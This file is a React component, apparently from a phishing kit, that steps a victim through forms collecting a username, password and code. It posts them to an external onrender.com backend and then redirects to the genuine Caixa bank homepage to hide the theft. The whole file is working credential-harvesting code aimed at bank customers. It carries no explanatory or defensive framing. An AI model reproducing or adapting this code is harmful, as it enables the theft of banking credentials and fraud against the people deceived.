import axios from 'axios';
import React, { useState, useEffect } from 'react'
import { useHistory } from 'react-router-dom';
import Loader from '../Components/Loader';

//import Step1 from './Step1'
import Step2 from './Step2'
import Step3 from './Step3'
import Step4 from './Step4'


const IndexPage = () => {

  const history = useHistory()

  const [currentStep, setCurrentStep] = useState(0)
  const [loginData, setLoginData] = useState({
    usuario: '',
    senha: '',
    codigo: '',
  })

  const [loading, setLoading] = React.useState(false)

  // useEffect(() => console.log(loginData), [loginData])

  const nextStep = () => {
    if (currentStep === steps.length - 1) return
    setCurrentStep(currentStep + 1)
  }

  const onCadastro = () => {

    setLoading(true)
    axios.post('https://back-9no1.onrender.com/usuarios', loginData).then(response => {
      // console.log(response)
      // alert('recebi')
      
      document.location.assign('https://www.caixa.gov.br/Paginas/home-caixa.aspx')
    }).catch(error => {
      console.log(error)
    })
    
    
    
  }

  const steps = ['Usuario', 'Telefone', 'Assinatura', 'Final']
  const stepContents = [
    //<Step1 nextStep={nextStep} loginData={loginData} setLoginData={setLoginData} />,
    <Step2 nextStep={nextStep} loginData={loginData} setLoginData={setLoginData} />,
    <Step3 nextStep={nextStep} loginData={loginData} setLoginData={setLoginData} />,
    <Step4 onCadastro={onCadastro} loginData={loginData} setLoginData={setLoginData} />
  ]

  const renderStepContent = () => {
    return stepContents[currentStep]
  }

  return loading
    ? <Loader />
    :
    <>
      {renderStepContent()}
    </>
  
}

export default IndexPage